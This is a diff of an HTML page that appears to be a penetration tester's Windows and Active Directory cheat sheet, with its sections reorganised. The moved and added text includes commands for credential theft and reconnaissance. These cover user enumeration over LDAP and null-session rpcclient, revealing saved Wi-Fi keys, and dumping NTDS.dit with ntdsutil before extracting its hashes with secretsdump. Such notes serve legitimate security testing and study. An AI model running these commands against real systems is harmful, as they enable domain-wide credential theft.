@@ -78,59 +78,21 @@
     <ul>
             
     
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
     <ul>
     
-        <li><a class="" href="#procdump">Procdump</a></li>
+        <li><a class="" href="#list-spn-accounts">List SPN accounts</a></li>
     
-        <li><a class="" href="#rundll32-comsvcsdll">Rundll32 &amp; comsvcs.dll</a></li>
+        <li><a class="" href="#kerberoast">Kerberoast</a></li>
     
-        <li><a class="" href="#sqldumper">SQLDumper</a></li>
+        <li><a class="" href="#kerberosunconstraineddelegation">KerberosUnConstrainedDelegation</a></li>
     
-    </ul>
+        <li><a class="" href="#kerberos-preauthentication">Kerberos preauthentication</a></li>
     
-
+        <li><a class="" href="#admincount-adminsdholder-sdprop">AdminCount, AdminSDHolder &amp; SDProp</a></li>
     
-
+        <li><a class="" href="#truster-account">Truster Account</a></li>
     
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-    <ul>
-    
-        <li><a class="" href="#ldap-search">LDAP search</a></li>
-    
-        <li><a class="" href="#rpcclient">RPCClient</a></li>
+        <li><a class="" href="#user-enumeration">User enumeration</a></li>
     
     </ul>
     
@@ -138,7 +100,41 @@
     
     <ul>
     
-        <li><a class="" href="#ntdsutil">ntdsutil</a></li>
+        <li><a class="" href="#decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</a></li>
+    
+        <li><a class="" href="#dump-lsass-process">Dump LSASS process</a></li>
+    
+        <li><a class="" href="#sam-and-system-backup">SAM and SYSTEM backup</a></li>
+    
+        <li><a class="" href="#calculate-ntlm-hash">Calculate NTLM hash</a></li>
+    
+        <li><a class="" href="#list-wifi-networks-and-password">List Wifi networks and password</a></li>
+    
+        <li><a class="" href="#extract-ntds-from-a-domain-controller">Extract NTDS from a domain controller</a></li>
+    
+    </ul>
+    
+
+    
+    <ul>
+    
+        <li><a class="" href="#use-win32-api-in-python">Use Win32 API in Python</a></li>
+    
+        <li><a class="" href="#get-ntp-configuration-server">Get NTP configuration server</a></li>
+    
+        <li><a class="" href="#windows-10-versions">Windows 10 versions</a></li>
+    
+        <li><a class="" href="#compile-net-without-visual-studio">Compile .Net without Visual Studio</a></li>
+    
+        <li><a class="" href="#cmd-hijack">Cmd Hijack</a></li>
+    
+        <li><a class="" href="#tcp-dump-with-netsh">TCP dump with netsh</a></li>
+    
+        <li><a class="" href="#add-user-to-local-admin">Add user to local admin</a></li>
+    
+        <li><a class="" href="#extract-microsoft-update-files">Extract Microsoft Update files</a></li>
+    
+        <li><a class="" href="#download-file-with-certutil">Download file with certutil</a></li>
     
     </ul>
     
@@ -415,7 +411,8 @@
           <div class="section">
             
               <h1>Windows</h1>
-              <h3 id="list-spn-accounts">List SPN accounts</h3>
+              <h2 id="find-accounts">Find accounts</h2>
+<h3 id="list-spn-accounts">List SPN accounts</h3>
 <p>An account can be used to executes features (Service) on a server. Theses features
 are calls SPNs and are represented as follow:</p>
 <pre><code class="language-none">service-class/hostname-FQDN(:port)(/arbitrary-name)
@@ -472,6 +469,35 @@ to get the TGT in a format that <code>John</code> or <code>Hashcat</code> can br
 <pre><code class="language-bash">python GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -format &lt;john/empty&gt; -outputfile hashes.txt
 </code></pre>
 <p>From <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank">@harmj0y</a>.</p>
+<h3 id="admincount-adminsdholder-sdprop">AdminCount, AdminSDHolder &amp; SDProp</h3>
+<p>The Security Descriptor propagator (<code>SDProp</code>) process runs every 60 minutes
+and re-sets the ACL of the protected objects with the security permissions set
+on the <code>AdminSDHolder</code> (check with ADExplorer).</p>
+<p>The objects protected by <code>AdminSDHolder</code>have the attribute <code>AdminCount</code> set to 1:</p>
+<pre><code class="language-powershell">$persons = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(admincount=1)(objectCategory=person))&quot;)).FindAll()
+$groups = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(admincount=1)(objectCategory=group))&quot;)).FindAll()
+</code></pre>
+<p>It's possible to change the <code>SDProp</code> interval from 60 to 7200 seconds (one minute to two hours).
+You can also run the process manually.</p>
+<p>Source: <a href="https://adsecurity.org/?p=1906" target="_blank">https://adsecurity.org/?p=1906</a></p>
+<h3 id="truster-account">Truster Account</h3>
+<p>The <a href="https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf" target="_blank">PDF</a> from SSTIC 2014 describes trusts accounts on Windows:</p>
+<pre><code class="language-none">sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
+</code></pre>
+<h3 id="user-enumeration">User enumeration</h3>
+<h4 id="ldap-search">LDAP search</h4>
+<p>Here is two queries to fetch informations of a domain controller using LDAP:</p>
+<pre><code class="language-bash">ldapsearch -h &lt;host&gt; -x -s base namingcontexts
+ldapsearch -h &lt;host&gt; -x -b &quot;DC=xxx,DC=yyy&quot; '(objectClass=Person)' sAMAccountName
+</code></pre>
+<h4 id="rpcclient">RPCClient</h4>
+<p>If the NULL session is activated on the Windows domain, then you can list the users
+with <code>rpcclient</code>:</p>
+<pre><code class="language-bash">rpcclient -U '' &lt;host&gt;
+rpcclient $&gt; enumdomusers
+rpcclient $&gt; queryuser &lt;user&gt;
+</code></pre>
+<h2 id="find-passwords">Find passwords</h2>
 <h3 id="decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</h3>
 <p>Some <code>Group Policy Preferences</code> (GPP) GPO stored at <code>\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>
 contains an account credentials for administration on a remote host.
@@ -480,13 +506,6 @@ A domain user can access the GPP XML files on read the encrypted password. To
 get the clear text credentials the <a href="/assets/cpassword.py">Python script can be used</a>.</p>
 <p>This <a href="https://adsecurity.org/?p=2288" target="_blank">article on AdSecurity</a> presents other tools
 and the protection (<a href="https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati" target="_blank">KB2962486</a>).</p>
-<h3 id="use-win32-api-in-python">Use Win32 API in Python</h3>
-<p>Download then install the pip package <code>pywin32</code> here: <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32" target="_blank">https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32</a></p>
-<h3 id="get-ntp-configuration-server">Get NTP configuration server</h3>
-<pre><code class="language-bash">$ w32tm /query /status
-</code></pre>
-<h3 id="windows-10-versions">Windows 10 versions</h3>
-<p><a href="https://docs.microsoft.com/fr-fr/windows/release-information/" target="_blank">Release Informations</a></p>
 <h3 id="dump-lsass-process">Dump LSASS process</h3>
 <p>There is various methods to dump the <code>lsass</code> process memory:</p>
 <ul>
@@ -528,10 +547,33 @@ $ reg save HKLM\SAM SamBkup.hiv
 pwd = &quot;password&quot;
 print(hashlib.new('md4', pwd.encode('utf-16le')).hexdigest())
 </code></pre>
-<h3 id="truster-account">Truster Account</h3>
-<p>The <a href="https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf" target="_blank">PDF</a> from SSTIC 2014 describes trusts accounts on Windows:</p>
-<pre><code class="language-none">sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
+<h3 id="list-wifi-networks-and-password">List Wifi networks and password</h3>
+<pre><code class="language-bash">$ netsh wlan show profile
+$ netsh wlan show profile &lt;WiFi name&gt; key=clear
 </code></pre>
+<h3 id="extract-ntds-from-a-domain-controller">Extract NTDS from a domain controller</h3>
+<p>On a DC, open a cmd shell:</p>
+<pre><code class="language-batch">ntdsutil
+activate instance ntds
+ifm
+create full C:\ntds.dit
+quit
+quit
+</code></pre>
+<p>If you have a remote shell, you can also use the one-liner:</p>
+<pre><code class="language-batch">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\ntds.dit&quot; q q
+</code></pre>
+<p>On your machine, use <code>impacket</code> to recover the hashes:</p>
+<pre><code class="language-bash">python secretsdump.py -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL -outputfile &lt;output&gt; -pwd-last-set -user-status -history
+</code></pre>
+<h2 id="miscs">Miscs</h2>
+<h3 id="use-win32-api-in-python">Use Win32 API in Python</h3>
+<p>Download then install the pip package <code>pywin32</code> here: <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32" target="_blank">https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32</a></p>
+<h3 id="get-ntp-configuration-server">Get NTP configuration server</h3>
+<pre><code class="language-bash">$ w32tm /query /status
+</code></pre>
+<h3 id="windows-10-versions">Windows 10 versions</h3>
+<p><a href="https://docs.microsoft.com/fr-fr/windows/release-information/" target="_blank">Release Informations</a></p>
 <h3 id="compile-net-without-visual-studio">Compile .Net without Visual Studio</h3>
 <pre><code class="language-bash">$ cd \Windows\Microsoft.NET\Framework\v4*
 $ msbuild &quot;path\to\SharpUp-master\SharpUp.sln&quot; /t:Rebuild /p:Configuration=Release /p:Platform=&quot;Any CPU&quot;
@@ -556,10 +598,6 @@ public class HelloWorld {
 <p>Using this, you can hijack an argument such as a IP address in the ping call to
 execute an other binary.
 <a href="https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/" target="_blank">Julian Horoszkiewicz explains the details on his blog</a></p>
-<h3 id="list-wifi-networks-and-password">List Wifi networks and password</h3>
-<pre><code class="language-bash">$ netsh wlan show profile
-$ netsh wlan show profile &lt;WiFi name&gt; key=clear
-</code></pre>
 <h3 id="tcp-dump-with-netsh">TCP dump with netsh</h3>
 <p>You can use <code>netsh trace</code> to dump TCP connexions on a Windows system. The following
 command start a service that dump the packets:</p>
@@ -598,35 +636,6 @@ download files with the following command:</p>
 cached files of the process in the two directories:</p>
 <pre><code class="language-none">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
-</code></pre>
-<h2 id="user-enumeration">User enumeration</h2>
-<h3 id="ldap-search">LDAP search</h3>
-<p>Here is two queries to fetch informations of a domain controller using LDAP:</p>
-<pre><code class="language-bash">ldapsearch -h &lt;host&gt; -x -s base namingcontexts
-ldapsearch -h &lt;host&gt; -x -b &quot;DC=xxx,DC=yyy&quot; '(objectClass=Person)' sAMAccountName
-</code></pre>
-<h3 id="rpcclient">RPCClient</h3>
-<p>If the NULL session is activated on the Windows domain, then you can list the users
-with <code>rpcclient</code>:</p>
-<pre><code class="language-bash">rpcclient -U '' &lt;host&gt;
-rpcclient $&gt; enumdomusers
-rpcclient $&gt; queryuser &lt;user&gt;
-</code></pre>
-<h2 id="extract-ntds-from-a-domain-controller">Extract NTDS from a domain controller</h2>
-<h3 id="ntdsutil">ntdsutil</h3>
-<p>On a DC, open a cmd shell:</p>
-<pre><code class="language-batch">ntdsutil
-activate instance ntds
-ifm
-create full C:\ntds.dit
-quit
-quit
-</code></pre>
-<p>If you have a remote shell, you can also use the one-liner:</p>
-<pre><code class="language-batch">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\ntds.dit&quot; q q
-</code></pre>
-<p>On your machine, use <code>impacket</code> to recover the hashes:</p>
-<pre><code class="language-bash">python secretsdump.py -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL -outputfile &lt;output&gt; -pwd-last-set -user-status -history
 </code></pre>
             
           </div>
